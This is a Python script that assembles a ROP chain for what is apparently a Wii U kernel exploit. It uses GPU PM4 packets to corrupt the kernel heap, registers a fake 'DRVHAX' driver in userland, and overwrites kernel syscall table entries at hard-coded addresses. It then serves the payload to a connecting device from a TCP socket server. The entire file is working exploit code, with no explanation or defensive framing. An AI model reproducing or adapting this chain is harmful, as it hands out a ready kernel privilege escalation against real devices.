import socket, time, struct
from wiiu_rop_utils import *

rop = WiiU_ROP_Utils(1)

def calc_addr(idx):
	return (0x4D120000 + (idx *4))

def _byteswap_long(i):
    return struct.unpack("<I", struct.pack(">I", i))[0]

def GX2WaitForVsync():
	rop.tiny_call(ROP_GX2WaitForVsync)

# ROP CHAIN -------------------------------------------------------------------------------

KERNEL_SYSCALL_TABLE_1 = 0xFFE84C70
KERNEL_SYSCALL_TABLE_2 = 0xFFE85070
KERNEL_SYSCALL_TABLE_3 = 0xFFE85470
KERNEL_SYSCALL_TABLE_4 = 0xFFEAAA60
KERNEL_SYSCALL_TABLE_5 = 0xFFEAAE60

driver_name_idx = 488
pm4_packets_idx = 472
mem_patches = driver_name_idx + 3
kernel_stuff = mem_patches + 2

pm4_pkt1 = calc_addr(pm4_packets_idx)
drv_name = calc_addr(driver_name_idx)

# patch the kernel heap so the next allocation ends in userland
rop.DCFlushRange(pm4_pkt1, 0x40)
rop.tiny_call(ROP_GX2DirectCallDisplayList, pm4_pkt1, 32)
rop.GX2Flush()
GX2WaitForVsync()
GX2WaitForVsync()

# write our fake kernel heap metadata
rop.write32(0x1F200014 + 0x00, 0x105F0000)
rop.write32(0x1F200014 + 0x04, 0xFFFFFFB4)
rop.call_func(ROP_memset, 0x1F200014 + 0x08, 0xFFFFFFFF, 8)
rop.DCFlushRange(0x1F200014, 32)
rop.tiny_call(0x020003A0 - 0xFE3C00)

# register an OSDriver into userland
rop.OSDriver_Register(drv_name, 6)

# patch memory addr table
rop.write32(0x105F0000 + 0x44, 0xFFEAB7A0 + (0x12*4))
rop.OSDriver_CopyToSaveArea(drv_name, 6, calc_addr(mem_patches), 8)

# patch syscalls

rop.write32(0x105F0000 + 0x44, KERNEL_SYSCALL_TABLE_1 + (0x25*4))
rop.OSDriver_CopyToSaveArea(drv_name, 6, calc_addr(kernel_stuff), 4)

rop.write32(0x105F0000 + 0x44, KERNEL_SYSCALL_TABLE_2 + (0x25*4))
rop.OSDriver_CopyToSaveArea(drv_name, 6, calc_addr(kernel_stuff), 4)

rop.write32(0x105F0000 + 0x44, KERNEL_SYSCALL_TABLE_3 + (0x25*4))
rop.OSDriver_CopyToSaveArea(drv_name, 6, calc_addr(kernel_stuff), 4)

rop.write32(0x105F0000 + 0x44, KERNEL_SYSCALL_TABLE_4 + (0x25*4))
rop.OSDriver_CopyToSaveArea(drv_name, 6, calc_addr(kernel_stuff), 4)

rop.write32(0x105F0000 + 0x44, KERNEL_SYSCALL_TABLE_5 + (0x25*4))
rop.OSDriver_CopyToSaveArea(drv_name, 6, calc_addr(kernel_stuff), 4)

# patch kernel next driver ptr
rop.write32(0x105F0000 + 0x44, 0xFFEAB530)
rop.OSDriver_CopyToSaveArea(drv_name, 6, 0x105F0000 + 0x48, 4)

# reset kernel heap next index
rop.tiny_call(ROP_GX2DirectCallDisplayList, pm4_pkt1 + 0x20, 32)
GX2WaitForVsync()
GX2WaitForVsync()

rop.tiny_call(ROP_Restart, 0, 0)
rop.append(ROP_OSExitThread)

# end of ROP CHAIN ------------------------------------------------------------------------

# placing our  data -----------------------------------------------------------------------

curr_idx = len(rop.rop_payload) + 1
tmp_addr = calc_addr(curr_idx)
while calc_addr(curr_idx) != ((tmp_addr + 0x20) & ~0x1F):
	rop.append(0)
	curr_idx = len(rop.rop_payload)

# pm4_pkt1 - patch kernel heap
rop.append(make_pm4_type3_packet_header(0x3D, 4))
rop.append(0x1B800000 + 8)
rop.append((1 << 18) | (0 << 17) | (0 << 16) | 0)
rop.append(_byteswap_long(0x02000000))
rop.append(0)
rop.append(0x80000000)
rop.append(0x80000000)
rop.append(0x80000000)

# pm4_pkt2 - patch kernel heap
rop.append(make_pm4_type3_packet_header(0x3D, 4))
rop.append(0x1B800000 + 8)
rop.append((1 << 18) | (0 << 17) | (0 << 16) | 0)
rop.append(0)
rop.append(0)
rop.append(0x80000000)
rop.append(0x80000000)
rop.append(0x80000000)

# driver name - "DRVHAX"
rop.append(0x44525648)
rop.append(0x41580000)

rop.append(0)

rop.append(0x10000000)
rop.append(0x28305800)

rop.append(0xfff09e44)
rop.append(0xfff09e44)

# done placing our data -------------------------------------------------------------------






# debug stuff and padding

for i in range(len(rop.rop_payload)):
	print("%3d: %08X" %(i,rop.rop_payload[i]))


print("")
print("drv_name: " + str(rop.rop_payload.index(0x44525648)))
print("pkt_idxs: " + str(rop.rop_payload.index(make_pm4_type3_packet_header(0x3D, 4))))
print("patches: " + str(rop.rop_payload.index(0x28305800) - 1))
print("")
print("packet addr: " + hex(pm4_pkt1))
print("driver name: " + hex(drv_name))
print(kernel_stuff)
print("")
print(hex(len(rop.rop_payload)*4))

for i in range(2560 - len(rop.rop_payload)):
	if i >= 0:
		rop.append(0xF5A5A5A5)


rop_packet = struct.pack(">%iI" %len(rop.rop_payload), *rop.rop_payload)
print("")
input("Press ENTER to continue")



# socket server

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 12345))
s.listen(1)
conn = s.accept()
print('Connected by ', conn[1])
conn[0].send(rop_packet)